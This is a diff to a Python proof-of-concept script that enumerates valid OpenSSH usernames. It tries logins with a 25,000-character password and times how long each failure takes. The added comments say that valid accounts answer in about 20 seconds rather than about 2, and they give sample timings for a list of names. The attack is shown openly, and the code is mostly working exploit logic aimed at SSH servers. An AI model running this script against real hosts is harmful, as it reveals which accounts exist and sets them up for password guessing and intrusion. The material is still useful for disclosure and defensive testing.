@@ -11,6 +11,19 @@
 # 
 # Based on Eddie Harari's opensshd user enumeration POC
 # http://seclists.org/fulldisclosure/2016/Jul/51
+#
+# Output is account: seconds
+# 
+# Valid users typically take over 20 seconds to respond, depending on system
+# speed and network congestion
+# 
+# Sample output vs. an Ubuntu 16.04 system (2ghz CPU, 8 gigs RAM), user
+# econrad is valid:
+#
+# jsnow: 2.3
+# dtargaryen: 2.66
+# econrad: 20.17
+# tlannister: 2.17
 
 import sys
 import os
@@ -19,7 +32,7 @@ import time
 import string
 
 file='wordlists/US-census2000-lastnames-top-100.txt'
-host='www.example.com'
+host='example.com'
 password='A'*25000
 port=22
 
@@ -41,6 +54,7 @@ def sshconnect(host, user, port, password):
   try:
     ssh.connect(host, username=user, port=port, password=password)
   except:
+    #print round(time.time()-starttime,2), user
     print round(time.time()-starttime,2)
 
 if (not os.path.isfile(file)):
